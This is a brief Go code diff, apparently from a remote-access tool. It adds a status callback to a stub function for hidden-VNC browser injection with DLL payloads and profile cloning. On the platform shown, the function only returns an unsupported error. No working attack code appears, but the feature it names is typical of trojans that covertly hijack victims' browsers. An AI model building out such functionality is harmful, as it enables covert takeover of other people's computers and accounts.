@@ -14,8 +14,9 @@ func StartHVNCChromeInjected(chromePath string, dllBytes []byte, captureDllBytes
 
 type CloneProgressFunc func(percent int, copiedBytes, totalBytes int64, status string)
 type DXGIStatusFunc func(success bool, gpuPID uint32, message string)
+type LaunchStatusFunc func(step string, success bool, detail string)
 
-func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, captureDllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc) error {
+func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, captureDllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc, onLaunchStatus LaunchStatusFunc) error {
 	return errors.New("HVNC injection not supported on this platform")
 }
 
